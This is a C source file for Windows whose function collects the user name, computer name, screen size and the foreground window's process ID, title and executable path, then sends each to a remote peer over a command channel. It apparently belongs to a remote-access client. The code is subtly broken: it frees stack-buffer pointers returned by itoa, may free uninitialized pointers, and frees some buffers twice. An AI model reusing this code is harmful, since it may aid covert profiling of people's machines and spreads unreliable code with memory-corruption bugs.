#include <stdlib.h>
#include <windows.h>
#include <psapi.h>
#include "types.h"
#include "cmd/commands.h"
#include "net/interface.h"
#include "net/error.h"

#define COMMAND_INFO_BUFF 500
#define COMMAND_INFO_USERNAME 0x10
#define COMMAND_INFO_COMPUTERNAME 0x11
#define COMMAND_INFO_SC_WIDTH 0x12
#define COMMAND_INFO_SC_HEIGHT 0x13
#define COMMAND_INFO_FW_PID 0x14
#define COMMAND_INFO_FW_TITLE 0x15
#define COMMAND_INFO_FW_EXECUTABLE 0x16

int command_Info(void)
{
	uint8 spm[1] = { 0 }; 
	uint64 buffLen = COMMAND_INFO_BUFF;
	char buff[COMMAND_INFO_BUFF + 1];
	memset(buff, 0, COMMAND_INFO_BUFF + 1);
	
	if(!GetUserName(buff + 1, &buffLen))
	{
		spm[0] = COMMAND_INFO_USERNAME;

		if(net_SendCmd(spm, 1, COMMANDS_DISAPPROVE) == NET_LOST_CONNECTION)
		{
			return NET_LOST_CONNECTION;
		}
	}else{
		buff[0] = COMMAND_INFO_USERNAME;

		if(net_SendCmd((uint8*)buff, buffLen, COMMANDS_APPROVE) == NET_LOST_CONNECTION)
		{
			return NET_LOST_CONNECTION;
		}
	}

	uint8* rmsg;

	if(net_ReceiveDataTimeout(&rmsg, NET_RECV_TRIES) < 1)
	{
		free(rmsg);
		
		return NET_LOST_CONNECTION;
	}

	free(rmsg);
	buffLen = COMMAND_INFO_BUFF;
	memset(buff, 0, COMMAND_INFO_BUFF + 1);

	if(!GetComputerName(buff + 1, &buffLen))
	{
		spm[0] = COMMAND_INFO_COMPUTERNAME;

		if(net_SendCmd(spm, 1, COMMANDS_DISAPPROVE) == NET_LOST_CONNECTION)
		{
			return NET_LOST_CONNECTION;
		}
	}else{
		buff[0] = COMMAND_INFO_COMPUTERNAME;

		if(net_SendCmd((uint8*)buff, buffLen, COMMANDS_APPROVE) == NET_LOST_CONNECTION)
		{
			return NET_LOST_CONNECTION;
		}
	}

	if(net_ReceiveDataTimeout(&rmsg, NET_RECV_TRIES) < 1)
	{
		free(rmsg);

		return NET_LOST_CONNECTION;
	}

	free(rmsg);

	buffLen = COMMAND_INFO_BUFF;
	memset(buff, 0, COMMAND_INFO_BUFF + 1);

	int screen_val_4b = GetSystemMetrics(SM_CXVIRTUALSCREEN);
	char temp_buff[256];
	char* screen_val;

	if(!screen_val_4b)
	{
		spm[0] = COMMAND_INFO_SC_WIDTH;
		
		if(net_SendCmd(spm, 1, COMMANDS_DISAPPROVE) == NET_LOST_CONNECTION)
		{
			return NET_LOST_CONNECTION;
		}
	}else{
		screen_val = itoa(screen_val_4b, temp_buff, 10);
		
		strcpy(buff + 1, screen_val);
		buff[0] = COMMAND_INFO_SC_WIDTH;
		
		if(net_SendCmd((uint8*)buff, strlen(screen_val) + 1, COMMANDS_APPROVE) == NET_LOST_CONNECTION)
		{
			free(screen_val);
			
			return NET_LOST_CONNECTION;
		}
	}

	if(net_ReceiveDataTimeout(&rmsg, NET_RECV_TRIES) < 1)
	{
		free(rmsg);
		
		return NET_LOST_CONNECTION;
	}

	free(rmsg);
	buffLen = COMMAND_INFO_BUFF;
	memset(buff, 0, COMMAND_INFO_BUFF + 1);
	screen_val_4b = GetSystemMetrics(SM_CYVIRTUALSCREEN);

	if(!screen_val_4b)
	{
		spm[0] = COMMAND_INFO_SC_HEIGHT;
		
		if(net_SendCmd(spm, 1, COMMANDS_DISAPPROVE) == NET_LOST_CONNECTION)
		{
			free(screen_val);

			return NET_LOST_CONNECTION;
		}
	}else{
		screen_val = itoa(screen_val_4b, temp_buff, 10);
		
		strcpy(buff + 1, screen_val);
		buff[0] = COMMAND_INFO_SC_HEIGHT;
		
		if(net_SendCmd((uint8*)buff, strlen(screen_val) + 1, COMMANDS_APPROVE) == NET_LOST_CONNECTION)
		{
			free(screen_val);
			
			return NET_LOST_CONNECTION;
		}
	}

	if(net_ReceiveDataTimeout(&rmsg, NET_RECV_TRIES) < 1)
	{
		free(rmsg);
		
		return NET_LOST_CONNECTION;
	}

	free(rmsg);
	buffLen = COMMAND_INFO_BUFF;
	memset(buff, 0, COMMAND_INFO_BUFF + 1);
	HWND focusHand = GetForegroundWindow();

	if(focusHand)
	{
		uint64 focusPid;
		GetWindowThreadProcessId(focusHand, &focusPid);

		screen_val = itoa(focusPid, temp_buff, 10);
		
		strcpy(buff + 1, screen_val);
		buff[0] = COMMAND_INFO_FW_PID;

		if(net_SendCmd((uint8*)buff, strlen(screen_val) + 1, COMMANDS_APPROVE) == NET_LOST_CONNECTION)
		{
			free(screen_val);
			free(rmsg);
			
			return NET_LOST_CONNECTION;
		}

		if(net_ReceiveDataTimeout(&rmsg, NET_RECV_TRIES) < 1)
		{
			free(rmsg);
			
			return NET_LOST_CONNECTION;
		}

		free(rmsg);
		buffLen = COMMAND_INFO_BUFF - 1;
		memset(buff, 0, COMMAND_INFO_BUFF + 1);

		if(!GetWindowText(focusHand, (char*)buff + 1, buffLen))
		{
			spm[0] = COMMAND_INFO_FW_TITLE;
			
			if(net_SendCmd(spm, 1, COMMANDS_DISAPPROVE) == NET_LOST_CONNECTION)
			{
				free(screen_val);
	
				return NET_LOST_CONNECTION;
			}
		}else{
			buff[0] = COMMAND_INFO_FW_TITLE;
	
			if(net_SendCmd((uint8*)buff, strlen(buff + 1) + 1, COMMANDS_APPROVE) == NET_LOST_CONNECTION)
			{
				free(screen_val);

				return NET_LOST_CONNECTION;
			}
		}

		if(net_ReceiveDataTimeout(&rmsg, NET_RECV_TRIES) < 1)
		{
			free(rmsg);
			
			return NET_LOST_CONNECTION;
		}

		free(rmsg);
		buffLen = COMMAND_INFO_BUFF - 1;
		memset(buff, 0, COMMAND_INFO_BUFF + 1);

		HANDLE hand = OpenProcess(PROCESS_QUERY_INFORMATION, 1, focusPid);
		
		if(!hand)
		{
			spm[0] = COMMAND_INFO_FW_EXECUTABLE;
			
			if(net_SendCmd(spm, 1, COMMANDS_DISAPPROVE) == NET_LOST_CONNECTION)
			{
				free(screen_val);
	
				return NET_LOST_CONNECTION;
			}
		}else{
			buff[0] = COMMAND_INFO_FW_EXECUTABLE;
		
			if(GetModuleFileNameEx(hand, NULL, buff + 1, COMMAND_INFO_BUFF - 1))
			{
				if(net_SendCmd((uint8*)buff, strlen(buff + 1) + 1, COMMANDS_APPROVE) == NET_LOST_CONNECTION)
				{
					free(screen_val);
	
					return NET_LOST_CONNECTION;
				}
			}else{
				spm[0] = COMMAND_INFO_FW_EXECUTABLE;

				if(net_SendCmd(spm, 1, COMMANDS_DISAPPROVE) == NET_LOST_CONNECTION)
				{
					free(screen_val);
		
					return NET_LOST_CONNECTION;
				}
			}

			CloseHandle(hand);
		}

		if(net_ReceiveDataTimeout(&rmsg, NET_RECV_TRIES) < 1)
		{
			free(rmsg);
			
			return NET_LOST_CONNECTION;
		}

		free(rmsg);
	}else{
		spm[0] = COMMAND_INFO_FW_PID;
		
		if(net_SendCmd(spm, 1, COMMANDS_DISAPPROVE) == NET_LOST_CONNECTION)
		{
			free(screen_val);

			return NET_LOST_CONNECTION;
		}

		spm[0] = COMMAND_INFO_FW_TITLE;
		
		if(net_SendCmd(spm, 1, COMMANDS_DISAPPROVE) == NET_LOST_CONNECTION)
		{
			free(screen_val);

			return NET_LOST_CONNECTION;
		}

		spm[0] = COMMAND_INFO_FW_EXECUTABLE;
		
		if(net_SendCmd(spm, 1, COMMANDS_DISAPPROVE) == NET_LOST_CONNECTION)
		{
			free(screen_val);

			return NET_LOST_CONNECTION;
		}
	}

	free(rmsg);
	free(screen_val);

	return COMMANDS_SUCC;
}